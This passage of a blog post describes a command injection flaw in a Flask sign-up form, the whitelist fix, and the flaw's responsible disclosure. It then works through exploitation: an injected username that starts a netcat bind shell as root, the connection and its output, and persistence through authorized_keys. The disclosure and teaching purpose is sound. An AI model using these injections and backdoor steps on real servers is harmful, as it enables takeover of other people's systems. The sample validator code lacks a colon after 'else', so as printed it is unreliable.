<p>This will create the user &ldquo;mark&rdquo;, but it will also cause <code>ls -l</code> to be executed, which will list the files in the directory. Now the user that entered this in the form isn&rsquo;t going to see anything; the command executes internally on the server. Hopefully you&rsquo;re seeing now why this is bad - anyone can execute any command on the server as the user that is running the Flask app. In this case it&rsquo;s particularly bad, because the app is running on port 80 of the server which is a &ldquo;privileged&rdquo; port. Since only the superuser is allowed to run network services on ports below 1024, essentially anyone now has root access to the server.</p>

<p>As a side note, the &ldquo;#&rdquo; in the injection is there to comment out the rest of the command (the &ldquo;-m&rdquo; part) so it doesn&rsquo;t interfere with the injection.</p>

<h2>Patching</h2>

<p>This is actually a really easy vulnerability to protect against, all that&rsquo;s required is to make sure that that the username and password fields are checked in some form before they are sent to the system call. In this case, we don&rsquo;t have to worry about the password, because it goes through encryption before being used in the system call, so any attempts to inject in the password field would fail when the attacker&rsquo;s injection gets encrypted.</p>

<p>To check the username input, it&rsquo;s important to use a <a href="https://www.owasp.org/index.php/Positive_security_model">positive security model</a> (a whitelist) over a negative one. This is because using a blacklist of specific characters that aren&rsquo;t allowed can be potentially incomplete and leaves the attacker room to find sneaky ways to exploit this vulnerability using alternative characters that aren&rsquo;t in your blacklist. As a general rule, it&rsquo;s better to use a whitelist of only the characters that are permitted. In this case, for a username, let&rsquo;s say that users should only be allowed to have usernames with lowercase letters, uppercase letters, underscores, and periods. Writing a function to check for this would look like this:</p>

<pre><code class="python">import re
def valid_username(name):
    if re.search('[^\w.]', name):
        return False
    else
        return True
</code></pre>

<p>In this particular approach, we aren&rsquo;t <em>really</em> sanitizing the input, we&rsquo;re just checking it&rsquo;s validity. In this case, if this function returned false, the <code>create_account</code> function would fail, and we would show an error to the user. An alternative would be to attempt to correct invalid user input by removing invalid characters, however despite potential UX arguments, I think it&rsquo;s personally better just to halt completely and let the user sort it out on their end.</p>

<h3>Exploiting</h3>

<p>Now that we&rsquo;ve described how the vulnerability works, and how to protect against it, let&rsquo;s dirty our white hats a little and check out some steps an attacker might take once discovering the vulnerability.</p>

<p>First of all, we know that we can execute arbitrary commands on the server as the root user. To most, this pretty much is already the definition of being 0wned. However, doing so is sort of awkward; we have to go to the login form and create a new user for every command we want to execute. Let&rsquo;s use netcat to create a rudimentary backdoor into the system by telling netcat to listen on an arbitrary port (say, 1337) and executing a certain file upon receiving a connection (say, <code>/bin/sh</code>).</p>

<p>This command looks like</p>

<pre><code class="sh">$ netcat -l -p 1337 -e /bin/sh
</code></pre>

<p>and so our injection would look like</p>

<pre><code class="sh">mark; netcat -l -p 1337 -e /bin/sh &amp; #
</code></pre>

<p>Notice that I added a &ldquo;&amp;&rdquo; before the &ldquo;#&rdquo; in the injection. This will cause the backdoor to run in the background because otherwise the flask process would stop while the backdoor is running, and the webapp would stop working. Not very stealthy. When we enter this into the create account form, we won&rsquo;t get any sort of confirmation that our backdoor is working, however we&rsquo;ll know soon enough when we test it. To connect, all we need to do is run</p>

<pre><code>$ netcat [ip address] 1337
</code></pre>

<p>which will attempt to create a simple TCP connection to the IP address of the server on the same port you specified earlier. If it worked, you won&rsquo;t get a prompt, but you&rsquo;ll have a shell that you can enter commands at. With spaces added for ease of reading, this looks like</p>

<pre><code>$ netcat 1.2.3.4 1337

ls
imadeit.db
imadeit.py
schema.sql
static
templates
user.py
user.pyc

whoami
root

echo $SHELL
/bin/bash
</code></pre>

<p>Now, the server has been totally owned. Next steps could include adding your ssh public key to the <code>~/.ssh/authorized_keys</code> file for enhanced persistence if the server got restarted, or if someone saw your backdoor and killed it. In a situation where the app wasn&rsquo;t running on port 80 and was running on a nonprivileged port instead, you wouldn&rsquo;t necessarily have root access so you would then use a local exploit to escalate privileges. However for this situation, even exploiting this vulnerability at all is sort of pointless because the webapp actually <em>creates an account for you</em> on the server which you can ssh into, and legitimately get a shell.</p>

<h2>Conclusion</h2>

<p>I hope you can see now how even something as simple as checking user input in a webapp can go a long way in securing your web site and making sure you don&rsquo;t get hacked. After discovering the vuln, I submitted a pull request to iMadeIT&rsquo;s repo on github, which was merged and deployed an astonishing <a href="https://github.com/imadeitnortheastern/spring2014/pull/1"><em>5 minutes</em></a> later, so serious props to them for that. I&rsquo;ve never discovered a serious vulnerability &ldquo;in the wild&rdquo; before, so it was sort of cool to go through the process of submitting the patch and then confirming that it was working in the live site.</p>

<p>That&rsquo;s all, thanks for reading!</p>
]]></content>
  </entry>
  
</feed>
